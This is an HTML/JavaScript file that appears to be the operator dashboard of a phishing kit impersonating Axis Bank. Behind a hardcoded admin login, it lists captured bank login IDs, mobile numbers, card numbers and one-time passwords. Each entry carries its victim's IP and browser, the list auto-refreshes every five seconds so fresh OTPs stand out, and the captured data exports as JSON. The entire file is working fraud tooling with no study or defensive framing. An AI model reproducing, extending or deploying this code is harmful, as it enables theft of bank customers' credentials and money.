<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Axis Bank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: #0f0f1a;
            min-height: 100vh;
            overflow-x: hidden;
            color: white;
        }
        
        /* Password Login */
        .login-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #87103F 0%, #2c0b0e 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .login-box {
            background: rgba(0, 0, 0, 0.6);
            padding: 40px;
            border-radius: 15px;
            width: 90%;
            max-width: 400px;
            border: 2px solid #87103F;
            box-shadow: 0 10px 30px rgba(135, 16, 63, 0.4);
        }
        
        .login-title {
            color: white;
            text-align: center;
            font-size: 28px;
            margin-bottom: 25px;
            text-shadow: 0 2px 10px rgba(255, 255, 255, 0.2);
        }
        
        .login-input {
            width: 100%;
            padding: 15px;
            margin-bottom: 20px;
            border: 2px solid #87103F;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.05);
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        
        .login-input:focus {
            outline: none;
            border-color: #ff4757;
            box-shadow: 0 0 15px rgba(255, 71, 87, 0.3);
            background: rgba(255, 255, 255, 0.1);
        }
        
        .login-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        
        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #87103F 0%, #a0144a 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            letter-spacing: 1px;
        }
        
        .login-btn:hover {
            background: linear-gradient(135deg, #a0144a 0%, #87103F 100%);
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(135, 16, 63, 0.6);
        }
        
        .login-error {
            color: #ff4757;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            display: none;
            animation: shake 0.5s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        /* Admin Panel */
        .admin-panel {
            display: none;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        /* Header */
        .panel-header {
            background: linear-gradient(135deg, #87103F 0%, #2c0b0e 100%);
            color: white;
            padding: 20px;
            margin-bottom: 25px;
            border-radius: 15px;
            border: 1px solid #87103F;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .header-title {
            font-size: 24px;
            font-weight: bold;
        }
        
        .stats-container {
            display: flex;
            gap: 15px;
        }
        
        .stat-box {
            background: rgba(255, 255, 255, 0.1);
            padding: 8px 15px;
            border-radius: 8px;
            font-size: 14px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .stat-value {
            color: #ff4757;
            font-weight: bold;
            margin-left: 5px;
        }
        
        .refresh-info {
            text-align: center;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.8);
            padding-top: 15px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .blink-dot {
            width: 8px;
            height: 8px;
            background: #00ff00;
            border-radius: 50%;
            display: inline-block;
            margin-right: 8px;
            animation: blink 1s infinite;
            box-shadow: 0 0 10px #00ff00;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        /* Controls */
        .controls {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .control-btn {
            padding: 12px 20px;
            background: rgba(135, 16, 63, 0.3);
            border: 1px solid #87103F;
            color: white;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 14px;
        }
        
        .control-btn:hover {
            background: #87103F;
            transform: translateY(-2px);
        }
        
        /* Submissions List */
        .submissions-container {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid #87103F;
            max-height: 70vh;
            overflow-y: auto;
        }
        
        .submissions-header {
            display: grid;
            grid-template-columns: 80px 120px 1fr 150px 120px;
            padding: 15px;
            background: rgba(135, 16, 63, 0.3);
            border-radius: 10px;
            margin-bottom: 15px;
            font-weight: bold;
            font-size: 14px;
            border-bottom: 2px solid #87103F;
        }
        
        .submission-item {
            display: grid;
            grid-template-columns: 80px 120px 1fr 150px 120px;
            padding: 15px;
            margin-bottom: 10px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
            font-size: 13px;
        }
        
        .submission-item.new {
            background: rgba(135, 16, 63, 0.3);
            border: 1px solid #ff4757;
            animation: highlight 5s infinite;
            box-shadow: 0 0 20px rgba(255, 71, 87, 0.3);
        }
        
        @keyframes highlight {
            0%, 100% { 
                background: rgba(135, 16, 63, 0.3);
                border-color: #ff4757;
            }
            50% { 
                background: rgba(160, 20, 74, 0.4);
                border-color: #ff6b81;
            }
        }
        
        .submission-item:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: translateX(5px);
        }
        
        .submission-id {
            color: #ff4757;
            font-weight: bold;
        }
        
        .submission-type {
            text-transform: uppercase;
            font-weight: bold;
            padding: 3px 8px;
            border-radius: 4px;
            display: inline-block;
            text-align: center;
        }
        
        .type-login {
            background: rgba(76, 175, 80, 0.2);
            color: #4CAF50;
            border: 1px solid #4CAF50;
        }
        
        .type-credit {
            background: rgba(33, 150, 243, 0.2);
            color: #2196F3;
            border: 1px solid #2196F3;
        }
        
        .type-otp {
            background: rgba(255, 193, 7, 0.2);
            color: #FFC107;
            border: 1px solid #FFC107;
        }
        
        .submission-data {
            word-break: break-all;
            line-height: 1.4;
        }
        
        .data-label {
            color: rgba(255, 255, 255, 0.7);
            font-size: 12px;
        }
        
        .data-value {
            color: white;
            font-weight: 500;
        }
        
        .data-value.otp {
            color: #ff4757;
            font-weight: bold;
            font-size: 16px;
            text-shadow: 0 0 10px rgba(255, 71, 87, 0.5);
        }
        
        .submission-time {
            color: rgba(255, 255, 255, 0.7);
            font-size: 12px;
        }
        
        .submission-ip {
            color: rgba(255, 255, 255, 0.7);
            font-size: 11px;
            font-family: monospace;
        }
        
        .no-data {
            text-align: center;
            padding: 40px;
            color: rgba(255, 255, 255, 0.5);
            font-style: italic;
            grid-column: 1 / -1;
        }
        
        /* Modal for detailed view */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
        }
        
        .modal-content {
            background: #1a1a2e;
            padding: 30px;
            border-radius: 15px;
            width: 90%;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            border: 2px solid #87103F;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #87103F;
        }
        
        .modal-title {
            font-size: 20px;
            font-weight: bold;
        }
        
        .modal-close {
            background: #87103F;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
        }
        
        .modal-data {
            font-family: monospace;
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 8px;
            white-space: pre-wrap;
            word-break: break-all;
            font-size: 12px;
            max-height: 50vh;
            overflow-y: auto;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .admin-panel {
                padding: 10px;
            }
            
            .header-top {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
            
            .stats-container {
                justify-content: center;
                flex-wrap: wrap;
            }
            
            .submissions-header {
                display: none;
            }
            
            .submission-item {
                display: block;
                padding: 15px;
                margin-bottom: 15px;
            }
            
            .submission-id,
            .submission-type,
            .submission-data,
            .submission-time,
            .submission-ip {
                margin-bottom: 8px;
            }
        }
        
        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #87103F;
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #a0144a;
        }
    </style>
</head>
<body>
    <!-- Password Login Screen -->
    <div class="login-screen" id="loginScreen">
        <div class="login-box">
            <div class="login-title">üîê ADMIN PANEL</div>
            <input type="text" id="username" class="login-input" placeholder="Admin User ID" autocomplete="off">
            <input type="password" id="password" class="login-input" placeholder="Password" autocomplete="off">
            <button class="login-btn" onclick="login()">ENTER ADMIN PANEL</button>
            <div class="login-error" id="loginError">‚ö†Ô∏è Invalid credentials</div>
        </div>
    </div>
    
    <!-- Admin Panel -->
    <div class="admin-panel" id="adminPanel">
        <!-- Header -->
        <div class="panel-header">
            <div class="header-top">
                <div class="header-title">üìä AXIS BANK SUBMISSIONS</div>
                <div class="stats-container">
                    <div class="stat-box">Total: <span class="stat-value" id="totalCount">0</span></div>
                    <div class="stat-box">Today: <span class="stat-value" id="todayCount">0</span></div>
                    <div class="stat-box">New: <span class="stat-value" id="newCount">0</span></div>
                </div>
            </div>
            <div class="refresh-info">
                <span class="blink-dot"></span>
                Auto-refresh in: <span id="refreshTimer">5</span> seconds
            </div>
        </div>
        
        <!-- Controls -->
        <div class="controls">
            <button class="control-btn" onclick="refreshData()">üîÑ Refresh Now</button>
            <button class="control-btn" onclick="exportData()">üì• Export Data</button>
            <button class="control-btn" onclick="clearOldData()">üóëÔ∏è Clear Old (30+ days)</button>
            <button class="control-btn" onclick="logout()">üö™ Logout</button>
        </div>
        
        <!-- Submissions List -->
        <div class="submissions-container">
            <div class="submissions-header">
                <div>ID</div>
                <div>Type</div>
                <div>Data</div>
                <div>Time</div>
                <div>IP/Browser</div>
            </div>
            <div id="submissionsList">
                <div class="no-data">No submissions yet. Waiting for data...</div>
            </div>
        </div>
    </div>
    
    <!-- Modal for detailed view -->
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">Submission Details</div>
                <button class="modal-close" onclick="closeModal()">Close</button>
            </div>
            <div class="modal-data" id="modalData"></div>
        </div>
    </div>

    <script>
        // Admin Credentials
        const ADMIN_USER = "admin";
        const ADMIN_PASS = "18322387";
        
        let refreshInterval;
        let refreshTimer = 5;
        let currentSubmissions = [];
        
        // Check login on load
        document.addEventListener('DOMContentLoaded', function() {
            const savedLogin = localStorage.getItem('axisAdminLoggedIn');
            if (savedLogin === 'true') {
                showAdminPanel();
            }
            
            // Enter key login
            document.getElementById('password').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') login();
            });
            
            // Also check username field
            document.getElementById('username').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') login();
            });
        });
        
        // Login function
        function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (username === ADMIN_USER && password === ADMIN_PASS) {
                localStorage.setItem('axisAdminLoggedIn', 'true');
                showAdminPanel();
            } else {
                const errorEl = document.getElementById('loginError');
                errorEl.style.display = 'block';
                errorEl.textContent = '‚ùå Invalid credentials! Try again.';
                setTimeout(() => errorEl.style.display = 'none', 3000);
                
                // Shake animation
                errorEl.style.animation = 'none';
                setTimeout(() => {
                    errorEl.style.animation = 'shake 0.5s ease';
                }, 10);
            }
        }
        
        // Show admin panel
        function showAdminPanel() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
            refreshData();
            startAutoRefresh();
        }
        
        // Start auto refresh
        function startAutoRefresh() {
            clearInterval(refreshInterval);
            refreshInterval = setInterval(() => {
                refreshTimer--;
                document.getElementById('refreshTimer').textContent = refreshTimer;
                
                if (refreshTimer <= 0) {
                    refreshData();
                    refreshTimer = 5;
                }
            }, 1000);
        }
        
        // Refresh data
        function refreshData() {
            console.log('üîÑ Refreshing data...');
            const submissions = loadSubmissions();
            displaySubmissions(submissions);
            updateStats(submissions);
            refreshTimer = 5;
        }
        
        // Load submissions from localStorage
        function loadSubmissions() {
            try {
                const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions')) || [];
                console.log(`üìä Loaded ${submissions.length} submissions`);
                
                currentSubmissions = submissions;
                return submissions;
            } catch (error) {
                console.error('‚ùå Error loading submissions:', error);
                return [];
            }
        }
        
        // Update statistics
        function updateStats(submissions) {
            const total = submissions.length;
            
            // Calculate today's submissions
            const today = new Date().toDateString();
            const todayCount = submissions.filter(sub => {
                const subDate = new Date(sub.timestamp || sub.date).toDateString();
                return subDate === today;
            }).length;
            
            // Calculate new submissions (last 5 minutes)
            const newCount = submissions.filter(sub => {
                const subTime = new Date(sub.timestamp || sub.date).getTime();
                return (Date.now() - subTime) < 5 * 60 * 1000;
            }).length;
            
            document.getElementById('totalCount').textContent = total;
            document.getElementById('todayCount').textContent = todayCount;
            document.getElementById('newCount').textContent = newCount;
        }
        
        // Display submissions
        function displaySubmissions(submissions) {
            const container = document.getElementById('submissionsList');
            
            if (!submissions || submissions.length === 0) {
                container.innerHTML = '<div class="no-data">No submissions found in database</div>';
                return;
            }
            
            // Sort by timestamp (newest first)
            submissions.sort((a, b) => {
                const timeA = a.timestamp ? new Date(a.timestamp).getTime() : 0;
                const timeB = b.timestamp ? new Date(b.timestamp).getTime() : 0;
                return timeB - timeA;
            });
            
            let html = '';
            
            submissions.forEach((sub, index) => {
                // Get ID
                const subId = sub.id || `SUB${index + 1}`;
                
                // Get type
                const subType = sub.type || 'unknown';
                
                // Get formatted data
                const dataHtml = formatDataForGrid(sub);
                
                // Get time
                const timeString = formatTime(sub.timestamp || sub.date);
                
                // Get IP/Browser info
                const ipInfo = sub.ip || 'N/A';
                const browserInfo = sub.userAgent ? 
                    sub.userAgent.substring(0, 30) + '...' : 'N/A';
                
                // Check if new (within 5 minutes)
                const isNew = sub.timestamp ? 
                    (Date.now() - new Date(sub.timestamp).getTime()) < 5 * 60 * 1000 : 
                    false;
                
                // Type class
                const typeClass = `type-${subType}`;
                
                html += `
                    <div class="submission-item ${isNew ? 'new' : ''}" onclick="showDetails(${index})">
                        <div class="submission-id">${subId}</div>
                        <div class="submission-type ${typeClass}">${subType}</div>
                        <div class="submission-data">${dataHtml}</div>
                        <div class="submission-time">${timeString}</div>
                        <div class="submission-ip" title="${sub.userAgent || ''}">
                            ${ipInfo}<br>${browserInfo}
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        // Format time
        function formatTime(timestamp) {
            if (!timestamp) return 'N/A';
            
            try {
                const date = new Date(timestamp);
                return date.toLocaleString('en-IN', {
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit',
                    day: '2-digit',
                    month: 'short'
                });
            } catch (e) {
                return timestamp;
            }
        }
        
        // Format data for grid view
        function formatDataForGrid(sub) {
            if (sub.type === 'login' && sub.data) {
                return `<span class="data-label">ID:</span> <span class="data-value">${sub.data.loginId || 'N/A'}</span><br>
                        <span class="data-label">Mobile:</span> <span class="data-value">${sub.data.mobile || 'N/A'}</span>`;
            } else if (sub.type === 'credit' && sub.data) {
                return `<span class="data-label">Card:</span> <span class="data-value">${sub.data.cardNumber ? 'XXXX-XXXX-' + sub.data.cardNumber.slice(-4) : 'N/A'}</span><br>
                        <span class="data-label">Mobile:</span> <span class="data-value">${sub.data.mobile || sub.data.cardMobile || 'N/A'}</span>`;
            } else if (sub.type === 'otp' && sub.data) {
                return `<span class="data-label">OTP:</span> <span class="data-value otp">${sub.data.otp || 'N/A'}</span><br>
                        <span class="data-label">Mobile:</span> <span class="data-value">${sub.data.mobileNumber || 'N/A'}</span>`;
            } else {
                return 'View details...';
            }
        }
        
        // Show detailed view
        function showDetails(index) {
            const submission = currentSubmissions[index];
            const modalData = document.getElementById('modalData');
            const modalOverlay = document.getElementById('modalOverlay');
            
            let details = `=== SUBMISSION DETAILS ===\n\n`;
            details += `ID: ${submission.id || 'N/A'}\n`;
            details += `Type: ${submission.type || 'Unknown'}\n`;
            details += `Time: ${formatTime(submission.timestamp || submission.date)}\n`;
            details += `IP: ${submission.ip || 'N/A'}\n`;
            details += `User Agent: ${submission.userAgent || 'N/A'}\n\n`;
            
            details += `=== DATA ===\n`;
            
            if (submission.data) {
                for (const [key, value] of Object.entries(submission.data)) {
                    // Mask sensitive data
                    let displayValue = value;
                    if (key.toLowerCase().includes('password') || key === 'cvv') {
                        displayValue = '********';
                    } else if (key === 'cardNumber' && value) {
                        displayValue = value.replace(/\d(?=\d{4})/g, '*');
                    }
                    details += `${key}: ${displayValue}\n`;
                }
            }
            
            details += `\n=== RAW DATA ===\n`;
            details += JSON.stringify(submission, null, 2);
            
            modalData.textContent = details;
            modalOverlay.style.display = 'flex';
        }
        
        // Close modal
        function closeModal() {
            document.getElementById('modalOverlay').style.display = 'none';
        }
        
        // Export data as JSON
        function exportData() {
            const dataStr = JSON.stringify(currentSubmissions, null, 2);
            const dataBlob = new Blob([dataStr], {type: 'application/json'});
            const url = URL.createObjectURL(dataBlob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = `axis-submissions-${new Date().toISOString().split('T')[0]}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            alert(`‚úÖ Exported ${currentSubmissions.length} submissions`);
        }
        
        // Clear old data (30+ days)
        function clearOldData() {
            if (!confirm('Delete submissions older than 30 days?')) return;
            
            const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
            const filtered = currentSubmissions.filter(sub => {
                const subTime = new Date(sub.timestamp || sub.date).getTime();
                return subTime > thirtyDaysAgo;
            });
            
            localStorage.setItem('axisBankSubmissions', JSON.stringify(filtered));
            refreshData();
            
            alert(`üóëÔ∏è Cleared ${currentSubmissions.length - filtered.length} old submissions`);
        }
        
        // Logout
        function logout() {
            if (confirm('Are you sure you want to logout?')) {
                localStorage.removeItem('axisAdminLoggedIn');
                location.reload();
            }
        }
        
        // Auto-logout after 60 minutes
        setTimeout(() => {
            localStorage.removeItem('axisAdminLoggedIn');
            location.reload();
        }, 60 * 60 * 1000);
        
        // Close modal on overlay click
        document.getElementById('modalOverlay').addEventListener('click', function(e) {
            if (e.target === this) closeModal();
        });
    </script>
</body>
</html>
